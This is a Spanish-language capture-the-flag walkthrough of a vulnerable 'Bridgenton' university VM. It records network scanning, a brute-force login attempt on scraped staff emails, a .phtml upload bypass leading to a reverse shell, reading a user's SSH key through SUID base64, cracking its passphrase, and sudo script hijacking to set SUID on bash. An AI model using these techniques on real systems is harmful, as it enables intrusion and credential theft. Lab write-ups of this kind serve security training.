En primer lugar, vía `netdiscover`, sacamos la IP.

```zsh
netdiscover

192.168.1.164   08:00:27:ad:47:73      1      60  PCS Systemtechnik GmbH
```

Ahora que ya conocemos la IP se puede pasar al reconocimiento inicial. Este no revela más que un servidor web y uno SSH.

```zsh
nmap --top-ports 5000 -sT -A -T5 192.168.1.164 -oN top5000  

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)  
| ssh-hostkey:    
|   256 ad:fa:fa:1a:e7:99:65:1b:f9:e9:c4:55:be:f5:3a:f3 (ECDSA)  
|_  256 d7:87:d7:2e:d9:a3:4e:87:87:3d:b9:b8:ba:89:b5:fd (ED25519)  
80/tcp open  http    Apache httpd 2.4.57 ((Debian))  
|_http-server-header: Apache/2.4.57 (Debian)  
|_http-title: Universidad Bridgenton
```

Al visitar la página se puede observar que se trata de la web de una universidad, tras examinar rápidamente el código fuente y los endpoints que la propia página expone en su barra de navegación y un poco de fuzzing, se deduce esta estructura.

```mermaid
graph TD
    %% Nodo Principal
    raiz["<b>Raíz (/)</b><br/>index.html"]
    
    %% Nivel 1: Secciones Principales y Directorios
    admisiones["<b>Admisiones</b><br/>registro.php<br/><i> - Posible file upload</i>"]
    login["<b>Iniciar sesión</b><br/>login.php<br/><i> - Objetivo ataque diccionario</i>"]
    profesorado["<b>Profesorado</b><br/>profesorado.html<br/> juan.perez@thl[.]com<br/> maria.gomez@thl[.]com<br/> james@thl[.]com"]
    uploads["<b>/uploads</b><br/>Directorio de archivos"]
    
    %% Nivel 2: Hallazgos específicos (Fuzzing)
    registrar["<b>registrar.php</b><br/>Lógica de registro"]
    bienvenida["<b>bienvenida.php</b><br/>Panel post-login"]
    img1["james.jpg"]
    img2["maria.jpeg"]

    %% Jerarquía de Conexiones
    raiz --> admisiones
    raiz --> login
    raiz --> profesorado
    raiz --> uploads

    %% Relaciones de hallazgos del fuzzer
    admisiones --> registrar
    login --> bienvenida
    profesorado --> img1
    profesorado --> img2

    %% Estilos de hallazgos críticos
    style uploads fill:#f9f,stroke:#333,stroke-width:2px
    style registrar fill:#bbf,stroke:#333
    style bienvenida fill:#bbf,stroke:#333
    
    %% Enlaces
    click raiz "http://192.168.1.164/#"
    click admisiones "http://192.168.1.164/registro.php"
    click login "http://192.168.1.164/login.php"
    click profesorado "http://192.168.1.164/profesorado.html"
    click uploads "http://192.168.1.164/uploads/"
    click registrar "http://192.168.1.164/registrar.php"
    click bienvenida "http://192.168.1.164/bienvenida.php"
```

# Dos caminos
La sección de profesorado incluye los correos de los profesores, y como el inicio de sesión no tiene ningún tipo de baneo de rate limiting, esto habilita la posibilidad de hacer un ataque diccionario a los correos listados en dicha sección. 

```zsh
ffuf -u -r -c -t 100 -u 'http://192.168.1.164/procesar_login.php' -X POST -H 'Host: 192.168.1.164' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0' \
-H 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Origin: http://192.168.1.164' \
-H 'Connection:keep-alive' -H 'Referer: http://192.168.1.164/login.php' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -d 'email=FUZ1&password=FUZ2' -enc 'FUZ1:urlencode' -w mails:FUZ1 -w /usr/share/wordlists/rockyou.txt:FUZ2 -fw 9
```

Después de un rato no da resultado, pero mientras he ido probando cosas con el otro vector potencial de escalada, *file upload* en el formulario de registro, que permite la subida de imágenes. Tras un rato probando, doy con una extensión que si permite evadir los controles de seguridad (`.phtml`) y procedo a comprobar si funciona como se esperaba.

```http
-->
POST /procesar_registro.php HTTP/1.1
Host: 192.168.1.164
...

------geckoformboundary87bc70dc1a5e9aaeb46da1b67fb4d04e
Content-Disposition: form-data; name="nombre"

123123
------geckoformboundary87bc70dc1a5e9aaeb46da1b67fb4d04e
Content-Disposition: form-data; name="email"

123123@123123.2131
------geckoformboundary87bc70dc1a5e9aaeb46da1b67fb4d04e
Content-Disposition: form-data; name="password"

12313
------geckoformboundary87bc70dc1a5e9aaeb46da1b67fb4d04e
Content-Disposition: form-data; name="archivo"; filename="test.phtml"
Content-Type: application/octet-stream

<?php
phpinfo()
?>

------geckoformboundary87bc70dc1a5e9aaeb46da1b67fb4d04e--

===============================================================================================================================

<--
HTTP/1.1 200 OK
Date: Wed, 08 Apr 2026 11:15:13 GMT
Server: Apache/2.4.57 (Debian)
Vary: Accept-Encoding
Content-Length: 80
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Archivo cargado con éxito. Bienvenido, 123123, te has registrado correctamente.
```

Ahora, al visitar `/uploads` y clicar el archivo, este se ejecutará y veremos el menú de `phpinfo()`. Ahora, sustituimos el `phpinfo()` de la solicitud por una [reverse shell](https://www.revshells.com/) y reenviamos la solicitud (yo lo hice desde el Repeater de Burpsuite, pero se puede hacer una cuenta nueva).

Nos ponemos en escucha y ejecutamos de nuevo el archivo

```
penelope -p 444

www-data@Bridgenton:/$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Escalada
Cambio la shell a bash e inicio el reconocimiento interno para lograr escalada.
```zsh
export SHELL=bash  
source /etc/skel/.bashrc
```

Consigo la flag de user gracias sl bit SUID del binario `base64`

```zsh
www-data@Bridgenton:/tmp$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/base64  
...

www-data@Bridgenton:/tmp$ base64 /home/james/user.txt | base64 --decode
```

Gracias a este binario, se puede leer también el `id_rsa` del usuario James, una vez lo tenemos, tratamos de crackearlo con John y da resultado.

```zsh
www-data@Bridgenton:/$ base64 /home/james/.ssh/id_rsa | base64 --decode  
-----BEGIN OPENSSH PRIVATE KEY-----  
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  
miPO9cjj/N5uge70CWOIqG2YbP4=  
-----END OPENSSH PRIVATE KEY-----
```

```zsh
ssh2john id_rsa > hash    
              
john --wordlist=/usr/share/wordlists/rockyou.txt hash    
...
bowwow           (id_rsa)        
...
```

Ni siquiera hace falta usar SSH, con su vemos que ha reciclado la passphrase de la llave y podemos pivotar sin mayor complicación

```zsh
www-data@Bridgenton:/$ su james  
Password:    
james@Bridgenton:/$ id  
uid=1000(james) gid=1000(james) grupos=1000(james),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

# Root

La parte final de la escalada es más sencilla, vemos que el script `example.py` puede ejecutarse con privilegios root, y a pesar de que el archivo es propiedad de root, el directorio que lo contiene no lo es. Esto habilita la posibilidad de eliminar el archivo y crear uno nuevo con código que permita la escalada, en este caso, ejecutaremos como root un comando que da el bit SUID al binario `/bin/bash`, de manera que al lanzar una shell con `bash -p` (la flag `-p` hace heredar los privilegios del owner) somos root.

```zsh
james@Bridgenton:/opt$ sudo -l  
Matching Defaults entries for james on Bridgenton:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User james may run the following commands on Bridgenton:  
   (root) NOPASSWD: /usr/bin/python3 /opt/example.py  ## Podemos ejecutar example.py como root
james@Bridgenton:/opt$ ls -la  
total 12  
drwxr-xr-x  2 james root  4096 abr  9 11:27 .  
drwxr-xr-x 18 root  root  4096 mar 29  2024 ..  
-rw-rw-rw-  1 james james   44 abr  9 11:27 example.py  ## El archivo original de ha eliminado y sustituido por el arbitrario
james@Bridgenton:/opt$ cat example.py    
import os  
  
os.system("chmod u+s /bin/bash") ## Se añade el bit SUID a bash
 
james@Bridgenton:/opt$ sudo -u root /usr/bin/python3 /opt/example.py   ## Se ejecuta el script como root
james@Bridgenton:/opt$ bash -p  
  
bash-5.2# whoami  
root  ## Escalada realizada
bash-5.2# cat /root/root.txt    
************  

```